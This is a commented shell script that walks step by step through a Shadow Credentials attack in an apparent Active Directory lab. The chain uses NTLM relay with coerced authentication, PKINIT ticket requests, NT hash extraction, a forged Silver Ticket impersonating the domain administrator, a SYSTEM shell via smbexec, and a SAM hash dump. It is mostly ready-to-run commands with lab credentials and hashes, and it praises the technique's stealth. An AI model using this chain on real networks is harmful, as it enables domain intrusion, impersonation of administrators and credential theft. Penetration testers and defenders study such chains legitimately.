# Shadow Credentials Attack 

# This script demonstrates how to perform a Shadow Credentials attack and create a Silver Ticket in an Active Directory environment.

# Prerequisites:
# - A valid user account 
# - The targeted Windows machine should have the WebClient service running.

# Attack Steps: 
# 1.  First, we use NetExec's webdav module with our previously obtained credentials (i.e franky.lanie) to determine whether the target system has the WebClient service running.

nxc smb 192.168.56.10 -d offensive.local -u franky.lanie -p 'Password123' -M webdav

# 2. Next, we add a DNS record to the domain that resolves to the IP address of our attacking Kali Linux machine. This can be done using dnstool.py from the krbrelayx repository.
#           Creating this DNS entry is important because it ensures the target system classifies our machine as part of the “Intranet Zone.” 

python3 dnstool.py -u 'offensive.local\franky.lanie' -p 'Password123' -a add -r attacker -d 192.168.56.102 192.168.56.2

# Once the record is created, running host attacker.offensive.local will resolve to the IP address of our Kali attacker machine.

# 3. Next, we configure and launch ntlmrelayx to execute the Shadow Credentials attack. In this step, we specify the LDAP endpoint of the Domain Controller (ldap://192.168.56.2) and use the --shadow-credentials flag,
#           targeting a specific machine account (in this case, DESKTOP-L8S9RCS$). 

impacket-ntlmrelayx \   
  -t ldap://192.168.56.2 \
  --shadow-credentials \
  --shadow-target 'DESKTOP-L8S9RCS$' \
  --no-validate-privs \
  --no-dump \
  --no-da

# 4. Then, we use Coercer.py to trigger an authentication attempt from the target machine to our attacker-controlled relay.

python3 Coercer.py coerce \
  --auth-type http \
  -l attacker \
  -t 192.168.56.10 \
  -d OFFENSIVE.local \
  -u franky.lanie \
  -p 'Password123' \
  --filter-protocol-name MS-EFS


# The output in the ntlmrelayx terminal will show: "A TGT can now be obtained with {....}"

# 5 To validate the success of the Shadow Credentials attack, we run gettgtpkinit.py from the PKINITtools suite, as indicated in the previous output. This command uses the forged certificate (.pfx) to request a Ticket Granting
#          Ticket (TGT) on behalf of the compromised machine account (DESKTOP-L8S9RCS$).

python3 gettgtpkinit.py \
  -cert-pfx /home/kali/impacket/AWKr3y75.pfx \
  -pfx-pass a0GUXSHJelAzUUtaNwYn \
  -dc-ip 192.168.56.2 \
  'offensive.local/DESKTOP-L8S9RCS$' \
  AWKr3y75.ccache

# 6. We need to export the .ccache, as the next command expects that:

export KRB5CCNAME=/home/kali/PKINITtools/AWKr3y75.ccache


# 7. Next, we run getnthash.py to extract the NT hash of the machine account by using the previously obtained TGT and AS-REP encryption key. This step confirms full control over the account, as the recovered NT hash can now
#       be used for pass-the-hash authentication, further offline attacks or creating a Silver Ticket (this is the option that we will take).

python3 getnthash.py \
  -dc-ip 192.168.56.2 \
  -key 6ad3e4a93534bc06e55a5b7d5f3d20cc547c744a4e4586383d803e1a22e926d9 \
  'offensive.local/DESKTOP-L8S9RCS$'

# 8. After obtaining valid domain credentials (the ones’s of Franky), we used Impacket’s lookupsid.py to enumerate domain group memberships and extract the domain’s SID, S-1-5-21-2006739485-2589745431-2827281819. This
#       value is essential when forging Kerberos tickets such as Silver Tickets.

python3 examples/lookupsid.py \
  OFFENSIVE.local/franky.lanie:'Password123'@192.168.56.2

# 9 . In this scenario, we recovered the NT hash of the workstation account DESKTOP-L8S9RCS$ and used Impacket’s ticketer.py to forge a Silver Ticket. The ticket was crafted to impersonate the domain administrator 
#       OFFENSIVE.local/Administrator for the CIFS (SMB) service on DESKTOP-L8S9RCS.OFFENSIVE.local. 

# This form of impersonation is highly effective for post-exploitation, as it bypasses the domain controller entirely and remains stealthy until the ticket expires.

python3 examples/ticketer.py \
  -domain OFFENSIVE.local \
  -domain-sid S-1-5-21-2006739485-2589745431-2827281819 \
  -nthash c1c82b55222e779202fd940decd8419d \
  -spn cifs/DESKTOP-L8S9RCS.OFFENSIVE.local \
  administrator

# 10. We need to export the administrato.ccache, by running this command:

export KRB5CCNAME=./administrator.ccache  

# 11. The forged Silver Ticket was successfully used to authenticate as the domain administrator on the target machine (DESKTOP-L8S9RCS) using Impacket’s smbexec.py. The tool established a semi-interactive shell over SMB,
# proving that the ticket was accepted and that the machine recognizes the attacker as a privileged user, effectively granting remote command execution rights:

python3 examples/smbexec.py \
  -k -no-pass OFFENSIVE.local/administrator@DESKTOP-L8S9RCS.OFFENSIVE.local \
  -target-ip 192.168.56.10

# To further test, we can run in that powershell the following (with output below each command):

hostname
#DESKTOP-L8S9RCS

whoami
#nt authority\system

# 12. In the end, with the forged Silver Ticket, we can dump the SAM database of the target machine (DESKTOP-L8S9RCS) using Impacket’s secretsdump.py. This step allows us to extract password hashes and other sensitive information from the local SAM database.

python3 examples/secretsdump.py -k -no-pass \
  -exec-method smbexec \
  OFFENSIVE.local/administrator@DESKTOP-L8S9RCS.OFFENSIVE.local \
  -target-ip 192.168.56.10
